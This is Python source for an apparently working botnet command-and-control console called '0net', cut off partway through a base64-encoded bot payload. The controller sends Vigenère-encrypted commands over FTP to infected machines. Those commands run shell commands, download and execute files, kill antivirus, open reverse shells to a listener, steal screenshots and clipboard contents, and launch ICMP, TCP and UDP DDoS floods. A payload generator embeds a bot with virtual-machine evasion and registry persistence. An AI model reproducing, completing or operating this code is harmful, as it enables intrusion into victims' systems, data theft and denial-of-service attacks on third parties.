from ftplib import FTP
import time
import string
import requests
from requests import *
import threading;from threading import Thread
import random
import os
import os.path
import platform
from sys import platform


try:
    import socks
except:
    os.system("pip3 install PySocks")


############################################################################################################################################################################
############################################################################################################################################################################

obfuscate = () # Set Ofuscate Var
encryption_key = "" #Encryption key for encrypting outgoing oommands using Vigenère Cipher 

ftp_server = ''     # Your FTP server
ftp_username = ''         # Your username for FTP server
ftp_password = ''     # Your password for FTP server
ftp_directory = ''          # Your public/web facing directory


full_url = ""
response_file_url = "" # Full URL of the responses.txt file
information_file_url = ""   # Full URL of the data.txt file

command_file_name = ''                 # Local name/location of the pico-wifi command file
responses_file = ""       # Local location of the responses.txt file  
data_file = ""                 # Local location of data.txt file
screenshot_file = ""     # Local location for future 'screenshot.png' files

############################################################################################################################################################################
############################################################################################################################################################################


print("[%]Starting")



def helpm():
    
    print("\n[viewing/control]")
    print("[view] - View ALL currently connected bots")
    print("[refresh] - Refresh list of C&C server files & currently connected bots")
    print("[target] - Execute more targeted commands on a specific connected bot (targeted via its current public IP address)\n")

    
    print("[anonymization/anti-analysis]")
    print("[obfuscate] - ALL bots will halt outgoing connections to C&C server; ALL bots main payload file's properties, signature and extention type's change for a set amount of time to avoid anti-malware detection (bots cannot be used during this time)")
    print("[proxy] - Send ALL bots traffic through a HTTP-proxy to avoid exposing critical information in external connections via traffic analysis")
    print("[disable] - Kill all running processes of common antivirus(win) and anti-rootkit/file detection software(lin) on ALL bots systems to avoid the payload being periodically detected\n")
    

    print("[system/command-injection]")
    print("[echo] - Display text output on ALL bots payload terminal - TESTING PURPOSES!")
    print("[message] - Display a GUI message on ALL bots systems (Requires GUI - Check 'extract' command)")
    print("[cmd] - Execute system command on All bots systems")
    print("[download] - Download and execute a file from a URL on ALL bots systems")
    print("[redirect] - Redirect ALL bots to url via webbrowser\n")
    
    print("[DDOS/abuse]")
    print("[icmp-ddos] - Launch a collective ICMP based DDOS attack from ALL bots simultaneously to a target host/ip for a set amount of time")
    print("[tcp-ddos] - Launch a collective TCP based DDOS attack from ALL bots simultaneously to a target ip address for a set amount of time")
    print("[udp-ddos] - Launch a collective UDP based DDOS attack from ALL bots simultaneously to a target ip address and port number for a set amount of time\n")


def targhelpm():

    print("\n[system/command-injection]")
    print("[echo] - Display text output on a targeted systems payload terminal - TESTING PURPOSES!")
    print("[message] - Display a GUI message on a targeted bots system (Requires GUI - Check 'extract' command)")
    print("[cmd] - Execute system command on targeted system")
    print("[download] - Download and execute a file from a URL on bots system\n")

    print("[exfiltration/reconnaissance]")
    print("[extract] - Learn more about a bot by extracting information about the targets system and network (save the results locally in a text file on this system)")
    print("[screenshot] - Force bot to remotely take a full-image screenshot of the bots main display and temporarily upload to the server for automatic download (Requires GUI - Check 'extract' command)")
    print("[clipboard] - Extract most recent clipboard contents from bot and upload to server locally for download (Requires GUI - Check 'extract' command)\n")

    print("[remote-access/control]")
    print("[shell-external-tcp] - Force the bot to establish an external reverse TCP shell connection to a system; bot connects to a provided listening IP address and port number")
    print("[shell-external-http] - Force the bot to establish an external reverse HTTP shell connection to a system; bot connects to a provided listening hostname/address and port number\n")

    print("[misc]")
    print("[back] - Exit from targeted shell/choose new target\n")

          

try:
    ip = requests.get("https://api.ipify.org").content
except:
    print("[!]Error - WAN connection failed")
    exit()



print("""
[0] View Configuration Information
[1] Start Connection To C&C Server
[2] Configure Proxy/TOR Connection
[3] Generate Payload File
""")

while True:

    
    menu = input("<0net:> ")


    if menu =="0":

        print("\n[+]OUT-FACING")
        print("[%]C&C Domain:",full_url)
        print("[%]C&C Directory:",ftp_directory)
        print("[%]C&C Response File:",response_file_url)
        print("[%]C&C Information File:",information_file_url)
        print("[+]INTERNAL")
        print("[%]Connecting IP:",ip)
        print("[%]FTP Directory:",ftp_directory)
        print("[%]Response File:",responses_file)
        print("[%]Data File:",data_file)
        print("[%]Screenshot File:",screenshot_file)
        print("\n")
    
    if menu =="1":
        
        print("\n[%]Starting FTP connection")
        try:
            time.sleep(2)

            #files to be deleted
            
            files_to_delete = ['lock.txt', 'ips.txt', 'responses.txt']

            #connect to the FTP server
            
            ftp = FTP(ftp_server)
            ftp.login(user=ftp_username, passwd=ftp_password)
            ftp.cwd(ftp_directory)
            ftp.timeout = 999999
            ftp.set_pasv(True)

            def nop():
                while True:
                    time.sleep(10)         #persist connection to FTP server (avoid timeout errors)
                    ftp.voidcmd("NOOP")


            nops = threading.Thread(target=nop)
            nops.start()

            print("[+]FTP connection established")
        except Exception as E:
            print("[!]Error in FTP connection:",E)
            time.sleep(1)
            

        print("[%]Cleaning up files")

        def cls():

            for file_to_delete in files_to_delete:
                try:
                    ftp.delete(file_to_delete)
                except Exception as e:
                    print()
                    pass

            time.sleep(2)
            
        cls()
              
        print("[%]Starting server connection")

        try:
            
            time.sleep(2)
            files = ftp.nlst()
            file_to_edit = command_file_name
            
        except Exception as E:
            
            print("[!]Error in server connection:",E)
            break

        print("[+]Connection established\n")
        print("[%]use 'help' command for controls list\n")

        back = False

        while True:

            try:
                
                while True:

                    back = False
                    
                    choose = input("<0net/command:> ")

                    targ_commands = ["target","view","echo","message","cmd","redirect","obfuscate","help","","back","icmp-ddos","tcp-ddos","udp-ddos","refresh","proxy","disable","download"] #add new commands here

                    if choose in targ_commands:
                        mainfc = True

                    if choose not in targ_commands:
                        break

                    if choose =="":
                        _ = ""
                        break
                    

                    if choose =="help":
                        helpm()
                        break

                    if choose == "view":

                        print("\n[%]Current connected bots: \n")

                        file = responses_file
                        ftp.retrlines("RETR " + file, lambda line: print(line))
                        print("\n")
                        break

                    if choose == "back":
                        back = True
                        
                    if choose == "target":
                        
                        if back == True:
                            break
                        else:
                            back = False
                        while True:
                        
                            cmd = input("<0net/command/target/[enter IP address of target machine]:> ")

                            targ_commands = ["back","help","echo","message","cmd","extract","download","screenshot","clipboard","shell-external-tcp","shell-external-http"] #add new targeted commands here 

                            if cmd =="":
                                pass
                            
                            if cmd =="back":
                                mainfc = False
                                break

                            print("\n[%]use 'help' command for targeted controls list\n")


                            back = False
                            
                            while True:
                                
                                if back == True:
                                    break
                                
                                while True:

                                    back = False
                                    
                                    cmdip = input("<0net/command/target/"+cmd+":> ")

                                    if cmdip not in targ_commands:
                                        break
                                    
                                    if cmdip =="":
                                        break

                                    if cmdip =="back":
                                        mainfc = False

                                        back = True

                                    if cmdip =="help":
                                        targhelpm()
                                        break

                                    if cmdip =="clipboard":

                                        ras = ''.join(random.choice(string.ascii_letters) for _ in range(4))
                                        command = "ip("+cmd+")CLIPBOARD"

                                        print("[%]Obtaining clipboard information from "+cmd+"...")

                                        file = data_file
                                        local_file_path = "bot_information/"+"clipboard-"+cmd+"-"+ras+".txt"
                                    
                                        def prints():
                                            time.sleep(5)
                                            with open(local_file_path, "wb") as local_file:
                                                ftp.retrbinary("RETR " + file, local_file.write)

                                                print("\n[+]"+local_file_path,"saved\n")

                                        st = threading.Thread(target=prints)
                                        st.start()

                                      
                                    if cmdip =="download":

                                        url = input("<0net/command/target/"+cmd+"/[enter url of file (ex: https://example.com/file.exe)]:> ")

                                        command = "ip("+cmd+")"+"["+url+"]DOWNLOAD"


                                    if cmdip =="shell-external-tcp":


                                        host = input("<0net/command/target/"+cmd+"/[enter IP address of the listener]:> ")
                                        port = input("<0net/command/target/"+cmd+"/[enter port number of the listener]:> ")

                                        cmdip = host+":"+port

                                        command = "ip("+cmd+")"+"["+cmdip+"]SHELL-EXT-TCP"

                                        
                                    if cmdip =="shell-external-http":


                                        host = input("<0net/command/target/"+cmd+"/[enter url/host of the listener]:> ")
                                        port = input("<0net/command/target/"+cmd+"/[enter port number of the listener]:> ")

                                        cmdip = host+":"+port

                                        command = "ip("+cmd+")"+"["+cmdip+"]SHELL-EXT-HTTP"

                                    if cmdip =="echo":

                                        ex = input("<0net/command/target/"+cmd+"/echo/[enter message to send]:> ")
                                        cmdip = ex
                                        
                                        command = "ip("+cmd+")"+"["+cmdip+"]ECHO"

                                    if cmdip =="message":

                                        ex = input("<0net/command/target/"+cmd+"/echo/[enter message title]:> ")
                                        extwo = input("<0net/command/target/"+cmd+"/echo/[enter message body]:> ")
                                        
                                        cmdip = ex+":"+extwo
                                        
                                        command = "ip("+cmd+")"+"["+cmdip+"]MESSAGE"

                                    if cmdip =="cmd":

                                        ex = input("<0net/command/target/"+cmd+"/cmd/[enter system command to execute]:> ")
                                        cmdip = ex
                                        
                                        command = "ip("+cmd+")"+"["+cmdip+"]CMD"

                                    if cmdip =="extract":

                                        ras = ''.join(random.choice(string.ascii_letters) for _ in range(4))

                                        command = "ip("+cmd+")EXTRACT"

                                        print("[%]Obtaining information from "+cmd+"...")

                                        file = data_file
                                        local_file_path = "bot_information/"+cmd+"-"+ras+".txt"
                                    
                                        def prints():
                                            time.sleep(10)
                                            with open(local_file_path, "wb") as local_file:
                                                ftp.retrbinary("RETR " + file, local_file.write)

                                                print("\n[+]"+local_file_path,"saved\n")

                                        st = threading.Thread(target=prints)
                                        st.start()

                                    if cmdip =="screenshot":

                                        command = "ip("+cmd+")SCREENSHOT"

                                        ras = ''.join(random.choice(string.ascii_letters) for _ in range(4))             #ADD THREAD SCREENSHOT DOWNLOAD

                                        file = screenshot_file                                        
                                        local_file_path = "bot_information/"+cmd+"-"+ras+"-screenshot"+".png"

                                        def prints():
                                            
                                            try:
                                                time.sleep(6)
                                                with open(local_file_path, "wb") as local_file:
                                                    ftp.retrbinary("RETR " + file, local_file.write)

                                                    print("\n[+]"+local_file_path,"saved\n")
                                            except:
                                                print("[!]Screenshot failed - try again")

                                        st = threading.Thread(target=prints)
                                        st.start()

                                    if back == True:
                                        break
                                        
                                    command = str(command)
                                    cm = command

                                    print("[%]Encrypting command")

                                    text_to_encrypt = cm
                                    
                                    encrypted_text = ""
                                    key_length = len(encryption_key)

                                    for i in range(len(text_to_encrypt)):
                                        char = text_to_encrypt[i]
                                        key_char = encryption_key[i % key_length]

                                        if char.isalpha():
                                            is_upper = char.isupper()
                                            char_shift = ord(char) - ord('A') if is_upper else ord(char) - ord('a')
                                            key_shift = ord(key_char) - ord('A') if key_char.isupper() else ord(key_char) - ord('a')

                                            encrypted_char = chr(((char_shift + key_shift) % 26) + ord('A') if is_upper else ((char_shift + key_shift) % 26) + ord('a'))
                                            encrypted_text += encrypted_char
                                        elif char.isdigit():
                                            char_shift = int(char)
                                            key_shift = int(key_char, 36)
                                            
                                            encrypted_digit = str((char_shift + key_shift) % 10)
                                            encrypted_text += encrypted_digit
                                        else:
                                            encrypted_text += char

                                    cm = encrypted_text


                                    with open(file_to_edit, 'wb') as local_file:
                                        updated_content = cm.encode('utf-8')  #encode the string as bytes
                                        local_file.write(updated_content)

                                    with open(file_to_edit, 'rb') as local_file:
                                        ftp.storbinary(f"STOR {file_to_edit}", local_file)

                                    print("[+]Command sent to",cmd)
                                    time.sleep(2)
                                    command = ""
                                    cm = str(command)

                                    with open(file_to_edit, 'wb') as local_file:
                                        updated_content = cm.encode('utf-8')  #encode the string as bytes
                                        local_file.write(updated_content)

                                    with open(file_to_edit, 'rb') as local_file:
                                        ftp.storbinary(f"STOR {file_to_edit}", local_file)

                    if choose == "refresh":
                        cls()
                        break

                    if choose == "download":

                        url = input("<0net/command/[enter url of file (ex: https://example.com/file.exe)]:> ")
                        command = "download("+url+")ALL"

                        
                    if choose == "proxy":

                        ip = input("<0net/command/proxy/[enter IP of http-proxy]:> ")
                        port = input("<0net/command/proxy/[enter port of http-proxy]:> ")

                        command = "proxy("+ip+")"+"["+port+"]ALL"

                    if choose == "disable":

                        command = "disable()ALL"

                    if choose == "echo":
                        
                        cmd = input("<0net/command/echo/[enter message to send]:> ")
                        command = "echo("+cmd+")ALL"

                    if choose == "message":

                        cmd = input("<0net/command/echo/[enter message title]:> ")
                        cmdtwo = input("<0net/command/echo/[enter message body]:>")

                        command = "message("+cmd+")"+"["+cmdtwo+"]ALL"

                    
                    if choose == "cmd":
                        
                        cmd = input("<0net/command/cmd/[enter system command to execute]:> ")
                        command = "cmd("+cmd+")ALL"

                    if choose == "redirect":

                        cmd = input("<0net/command/redirect/[enter url to redirect]:> ")
                        command = "redirect("+cmd+")ALL"

                    if choose =="obfuscate":
                        
                        cmd = input("<0net/command/obfuscate/[enter amount of time to obfuscate]:> ")
                        command = "obfuscate("+cmd+")ALL"

                        timestop = int(cmd)
                        
                        obfuscate = True

                    if choose =="icmp-ddos":

                        hst = input("<0net/command/icmp-ddos/[enter target domain/ip address]:> ")
                        dur = input("<0net/command/icmp-ddos/[enter attack duration]:> ")
                        cmdip = hst+":"+dur

                        command = "icmp-ddos("+hst+")"+"["+dur+"]ALL"

                    if choose =="tcp-ddos":

                        hst = input("<0net/command/tcp-ddos/[enter target ip]:> ")
                        dur = input("<0net/command/tcp-ddos/[enter attack duration]:> ")
                        cmdip = hst+":"+dur

                        command = "tcp-ddos("+hst+")"+"["+dur+"]ALL"

                    if choose =="udp-ddos":

                        hst = input("<0net/command/udp-ddos/[enter target ip]:> ")
                        prt = input("<0net/command/udp-ddos/[enter target port number]:>")
                        dur = input("<0net/command/udp-ddos/[enter attack duration]:> ")

                        command = "udp-ddos("+hst+")"+"["+dur+"]"+"{"+prt+"}"+"ALL"
                                    


                    if choose =="":
                        _ = ""
                        break

                    if mainfc == True:
                        
                        command = str(command)
                        cm = command

                        print("[%]Encrypting command")

                        text_to_encrypt = cm
                        
                        encrypted_text = ""
                        key_length = len(encryption_key)

                        for i in range(len(text_to_encrypt)):
                            char = text_to_encrypt[i]
                            key_char = encryption_key[i % key_length]

                            if char.isalpha():
                                is_upper = char.isupper()
                                char_shift = ord(char) - ord('A') if is_upper else ord(char) - ord('a')
                                key_shift = ord(key_char) - ord('A') if key_char.isupper() else ord(key_char) - ord('a')

                                encrypted_char = chr(((char_shift + key_shift) % 26) + ord('A') if is_upper else ((char_shift + key_shift) % 26) + ord('a'))
                                encrypted_text += encrypted_char
                            elif char.isdigit():
                                char_shift = int(char)
                                key_shift = int(key_char, 36)
                                
                                encrypted_digit = str((char_shift + key_shift) % 10)
                                encrypted_text += encrypted_digit
                            else:
                                encrypted_text += char


                        cm = encrypted_text


                        with open(file_to_edit, 'wb') as local_file:
                            updated_content = cm.encode('utf-8')  #encode the string as bytes
                            local_file.write(updated_content)

                        with open(file_to_edit, 'rb') as local_file:
                            ftp.storbinary(f"STOR {file_to_edit}", local_file)

                        print("[+]Command sent to ALL bots")
                        time.sleep(2)
                        command = ""
                        cm = str(command)

                        with open(file_to_edit, 'wb') as local_file:
                            updated_content = cm.encode('utf-8')  #encode the string as bytes
                            local_file.write(updated_content)

                        with open(file_to_edit, 'rb') as local_file:
                            ftp.storbinary(f"STOR {file_to_edit}", local_file)

                        if obfuscate == True:
                            time.sleep(1)
                            print("[%]Bots are currently in obfuscation mode to avoid detection...")
                            time.sleep(timestop)
                            obfuscate = False
                        else:
                            pass
                    else:
                        pass

            except Exception as E:
                if "500" or "550" in str(E):
                    print("[%] No bots currently connected\n",)
                else:
                    print("\n[!] Error:",E)
                pass

    if menu =="2":

        back = False

        if back == True:
            break
        else:
            back = False

        print("\n[1] Use TOR")
        print("[2] Use proxy\n")

        while back == False:

            chsanon = input("<0net/security:> ")
            if chsanon =="back":
                back = True

            if chsanon =="1":

                tor_ip = "127.0.0.1" #configure TOR IP
                tor_port = "9150" #configure TOR Port

                try:
                    tor_proxy = {
                        'http': 'socks5://'+tor_ip+':'+tor_port,
                        'https': 'socks5://'+tor_ip+':'+tor_port,
                    }

                    print("\n[%] Connecting to TOR network on:",tor_ip+":"+tor_port)
                    os.environ['HTTP_PROXY'] = tor_proxy['http']
                    os.environ['HTTPS_PROXY'] = tor_proxy['https']
                    
                    url = 'https://api.ipify.org'
                    response = requests.get(url)

                    print("[+] Connected via TOR, IP:",response.text,"\n")
                    back = True
    
                except:
                    print("\n[!] Unable to establish TOR connection, please check configuration/network\n")

            if chsanon =="2":


                print("\n[1] HTTP")
                print("[2] HTTPS")
                print("[3] SOCKS4")
                print("[4] SOCKS5\n")

                proxytype = input("<0net/security/proxy/[enter proxy type]:> ")

                if proxytype == "1":
                    prx = "HTTP_PROXY"
                    prxc = str("http")
                elif proxytype == "2":
                    prx = "HTTPS_PROXY"
                    prxc = str("https")
                elif proxytype == "3":
                    prx = "SOCKS4_PROXY"
                    prxc = str("socks4")
                elif proxytype == "4":
                    prx = "SOCKS5_PROXY"
                    prxc = str("socks5")

                ip = input("<0net/security/proxy/[enter proxy IP]:> ")
                port = input("<0net/security/proxy/[enter proxy port]:> ")

                proxy = prxc+"://"+ip+":"+port

                os.environ['http_proxy'] = proxy
                os.environ['HTTP_PROXY'] = proxy
                os.environ['https_proxy'] = proxy
                os.environ['HTTPS_PROXY'] = proxy
                
                try:
                    r = requests.get("https://api.ipify.org").text
                    print("\n[+] Connected via proxy, IP:",r,"\n")
                    
                except Exception as E:
                    print("\n[!] Unable to establish connection, please check configuration/network\n")



    if menu =="3":

        try:
            import PyInstaller
        except:
            os.system("py -m pip install PyInstaller")
            os.system("pip install PyInstaller")

        print("\n[%]Generating Payload File")

        stng = ''.join(random.choices(string.ascii_letters + string.digits, k=3))

        payload_name = "payload-"+stng+".pyw"

        content = f'''

import time
import base64
import platform
import os
import sys
import time
import socket
import requests
from requests import get
import threading
from threading import Thread
import re
import webbrowser
import inspect
from shutil import copy
from pathlib import Path
import random
import uuid
import string
import urllib.request
from urllib import request, parse
import subprocess
import json
import ctypes
from io import BytesIO
import shutil
from datetime import datetime
import hashlib
import io
import urllib.parse
import urllib.request
import multiprocessing
import random

try:
    import winreg
except:
    pass

global gui
gui = ()

try:
    import tkinter as tk
    import pyautogui
    import pyscreenshot as ImageGrab
    import tkinter.messagebox
    gui = True
    
except:
    gui = False
    pass


code = "DQppbXBvcnQgcGxhdGZvcm0NCmltcG9ydCBvcw0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCmltcG9ydCBzb2NrZXQNCmltcG9ydCByZXF1ZXN0cw0KZnJvbSByZXF1ZXN0cyBpbXBvcnQgZ2V0DQppbXBvcnQgdGhyZWFkaW5nDQpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkDQppbXBvcnQgcmUNCmltcG9ydCB3ZWJicm93c2VyDQppbXBvcnQgaW5zcGVjdA0KZnJvbSBzaHV0aWwgaW1wb3J0IGNvcHkNCmZyb20gcGF0aGxpYiBpbXBvcnQgUGF0aA0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHV1aWQNCmltcG9ydCBzdHJpbmcNCmltcG9ydCB1cmxsaWIucmVxdWVzdA0KZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QsIHBhcnNlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGpzb24NCmltcG9ydCBjdHlwZXMNCmZyb20gaW8gaW1wb3J0IEJ5dGVzSU8NCmltcG9ydCBzaHV0aWwNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQppbXBvcnQgaGFzaGxpYg0KaW1wb3J0IGlvDQppbXBvcnQgdXJsbGliLnBhcnNlDQppbXBvcnQgdXJsbGliLnJlcXVlc3QNCmltcG9ydCBtdWx0aXByb2Nlc3NpbmcNCmltcG9ydCByYW5kb20NCg0KdHJ5Og0KICAgIGltcG9ydCB3aW5yZWcNCmV4Y2VwdDoNCiAgICBwYXNzDQoNCmdsb2JhbCBndWkNCmd1aSA9ICgpDQoNCnRyeToNCiAgICBpbXBvcnQgdGtpbnRlciBhcyB0aw0KICAgIGltcG9ydCBweWF1dG9ndWkNCiAgICBpbXBvcnQgcHlzY3JlZW5zaG90IGFzIEltYWdlR3JhYg0KICAgIGltcG9ydCB0a2ludGVyLm1lc3NhZ2Vib3gNCiAgICBndWkgPSBUcnVlDQogICAgDQpleGNlcHQ6DQogICAgZ3VpID0gRmFsc2UNCiAgICBwYXNzDQoNCiNweXNjcmVlbnNob3QNCiNyZXF1ZXN0cw0KI3B5YXV0b2d1aQ0KI3BpbGxvdw0KDQojTXVsdGlwbGUgYm90cyBvbiB0aGUgc2FtZSBuZXR3b3JrIG9yIHVuZGVyIHRoZSBzYW1lIGlwIHVzZSBhIHJvdW5kLXJvYmluIGJhc2VkIGFsZ29yaXRobSB0ZWNobmlxdWUgdG8ga2VlcCB0aGUgYyZjIHNlcnZlciBjb25uZWN0ZWQgdG8gdGhlIGRlc2lyZWQgbmV0d29yaywgdXNlZCB0byBhdm9pZCBoZWF2eSB0cmFmZmljIGxvYWRzIGFuZCBib3VuY2UgYXJvdW5kIHRoZSBuZXR3b3JrDQoNCmRlZiB2bV9kZXRlY3Rpb24oKToNCg0KICAgIHN5c3RlbSA9IHBsYXRmb3JtLnN5c3RlbSgpDQoNCiAgICBpZiBzeXN0ZW0gPT0gIldpbmRvd3MiOg0KDQogICAgICAgIHRyeTogDQogICAgICAgICAgICBkZWYgaXNfd2luZG93c192bSgpOg0KDQogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcdm1ndWVzdC5kbGwnKToNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb21tb25fdm1fcHJvY2Vzc2VzID0gWyd2bXdhcmUnLCAndmJveCcsICdxZW11JywgJ3ZpcnR1YWxib3gnLCAndmFncmFudCcsICd2bXRvb2xzZCddDQogICAgICAgICAgICAgICAgZm9yIHByb2Nlc3MgaW4gY29tbW9uX3ZtX3Byb2Nlc3NlczoNCiAgICAgICAgICAgICAgICAgICAgaWYgYW55KHByb2Nlc3MubG93ZXIoKSBpbiBwLmxvd2VyKCkgZm9yIHAgaW4gb3MucG9wZW4oJ3Rhc2tsaXN0JykucmVhZGxpbmVzKCkpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmlydHVhbF9yZWdfa2V5cyA9IFsNCiAgICAgICAgICAgICAgICAgICAgcidIS0VZX0xPQ0FMX01BQ0hJTkVcSEFSRFdBUkVcQUNQSVxEU0RUXFZCT1hfXycsDQogICAgICAgICAgICAgICAgICAgIHInSEtFWV9MT0NBTF9NQUNISU5FXEhBUkRXQVJFXERlc2NyaXB0aW9uXFN5c3RlbVxCSU9TXFZpcnR1YWxCb3gnLA0KICAgICAgICAgICAgICAgICAgICByJ0hLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcVkJveERydicNCiAgICAgICAgICAgICAgICBdDQogICAgICAgICAgICAgICAgZm9yIHJlZ19rZXkgaW4gdmlydHVhbF9yZWdfa2V5czoNCiAgICAgICAgICAgICAgICAgICAgaWYgb3Muc3lzdGVtKGYncmVnIHF1ZXJ5ICJ7cmVnX2tleX0iJykgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBUcnVlDQogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIGlzX3dpbmRvd3Nfdm0oKToNCiAgICAgICAgICAgICAgICBwcmludCgiVGhlIHByb2dyYW0gaXMgcnVubmluZyBvbiBvciBhbG9uZyBzaWRlIGEgdmlydHVhbCBtYWNoaW5lLiIpDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxMCkNCiAgICAgICAgICAgICAgICBleGl0KCkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQoIk5vIHZpcnR1YWxpc2F0aW9uIGRldGVjdGVkIikNCg0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIA0KICAgIGlmIHN5c3RlbSA9PSAiTGludXgiOg0KDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHJlc3VsdCA9IFtdDQogICAgICAgICAgICBudW1fdm1fZGV0ZWN0aW9ucyA9IDAgIA0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdGVzdCA9IDANCiAgICAgICAgICAgICAgICBsaXN0X2RpciA9IG9zLmxpc3RkaXIoJy91c3IvYmluLycpDQogICAgICAgICAgICAgICAgbGlzdHMgPSB7InZtd2FyZS0iLCAidmJveCJ9DQogICAgICAgICAgICAgICAgZm9yIGkgaW4gbGlzdHM6DQogICAgICAgICAgICAgICAgICAgIGlmIGFueShpIGluIHMgZm9yIHMgaW4gbGlzdF9kaXIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgdGVzdCArPSAxDQogICAgICAgICAgICAgICAgaWYgdGVzdCAhPSAwOg0KICAgICAgICAgICAgICAgICAgICBudW1fdm1fZGV0ZWN0aW9ucyArPSAxDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgaWYgJ2h5cGVydmlzb3InIGluIG9wZW4oIi9wcm9jL2NwdWluZm8iKS5yZWFkKCk6DQogICAgICAgICAgICAgICAgICAgIHJlc3VsdC5hcHBlbmQoTm9uZSkgIA0KICAgICAgICAgICAgICAgICAgICBudW1fdm1fZGV0ZWN0aW9ucyArPSAxDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgdGVzdCA9IDANCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIi9wcm9jL3Njc2kvc2NzaSIpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgIGxpc3RfZGlyID0gZi5yZWFkKCkuc3BsaXQoIiAiKQ0KICAgICAgICAgICAgICAgIGxpc3RzID0geyJWTXdhcmUiLCAiVkJPWCJ9DQogICAgICAgICAgICAgICAgZm9yIGkgaW4gbGlzdHM6DQogICAgICAgICAgICAgICAgICAgIGlmIGFueShpIGluIHMgZm9yIHMgaW4gbGlzdF9kaXIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgdGVzdCArPSAxDQogICAgICAgICAgICAgICAgaWYgdGVzdCAhPSAwOg0KICAgICAgICAgICAgICAgICAgICBudW1fdm1fZGV0ZWN0aW9ucyArPSAxDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgbmFtZSA9IG9wZW4oIi9zeXMvY2xhc3MvZG1pL2lkL2Jpb3NfdmVuZG9yIikucmVhZCgpDQogICAgICAgICAgICAgICAgdGVzdCA9IDANCiAgICAgICAgICAgICAgICBsaXN0cyA9IHsidm13YXJlIiwgInZib3giLCAiUGhvZW5peCIsICJpbm5vdGVrIn0NCiAgICAgICAgICAgICAgICBmb3IgaSBpbiBsaXN0czoNCiAgICAgICAgICAgICAgICAgICAgaWYgYW55KGkgaW4gcyBmb3IgcyBpbiBuYW1lKToNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdC5hcHBlbmQoTm9uZSkgIA0KICAgICAgICAgICAgICAgICAgICAgICAgdGVzdCArPSAxDQogICAgICAgICAgICAgICAgaWYgdGVzdCAhPSAwOg0KICAgICAgICAgICAgICAgICAgICBudW1fdm1fZGV0ZWN0aW9ucyArPSAxDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcGFzcw0KDQoNCiAgICAgICAgICAgIHZtX2RldGVjdGVkID0gbnVtX3ZtX2RldGVjdGlvbnMgPj0gMw0KDQogICAgICAgICAgICBpZiB2bV9kZXRlY3RlZDoNCiAgICAgICAgICAgICAgICBwcmludCgnXG5UaGUgcHJvZ3JhbSBpcyBydW5uaW5nIG9uIG9yIGFsb25nc2lkZSBhIHZpcnR1YWwgbWFjaGluZS4nKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApDQogICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHByaW50KCJObyB2aXJ0dWFsaXNhdGlvbiBkZXRlY3RlZCIpDQogICAgICAgICAgICAgICAgDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHBhc3MNCg0Kdm1fZGV0ZWN0aW9uKCkNCg0KdW5hbWUgPSBwbGF0Zm9ybS51bmFtZSgpDQpvcGVyYXRpbmdfc3lzdGVtID0gdW5hbWUuc3lzdGVtDQoNCmlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ1dpbmRvd3MnOg0KDQogICAgc2VwID0gb3MucGF0aC5zZXANCiAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkNCg0KICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOg0KICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuZXhlY3V0YWJsZSkNCg0KICAgIHNjcmlwdF9kaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoc2NyaXB0X3BhdGgpDQogICAgc2NyaXB0X2ZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShzY3JpcHRfcGF0aCkNCiAgICBzY3JpcHRfZGlyZWN0b3J5X2ZpbGVuYW1lID0gc2NyaXB0X2RpcmVjdG9yeSArIHNlcCArIHNjcmlwdF9maWxlbmFtZQ0KDQoNCiAgICBkZWYgcmVnX2tleSgpOg0KDQogICAgICAgIGlmIGN0eXBlcy53aW5kbG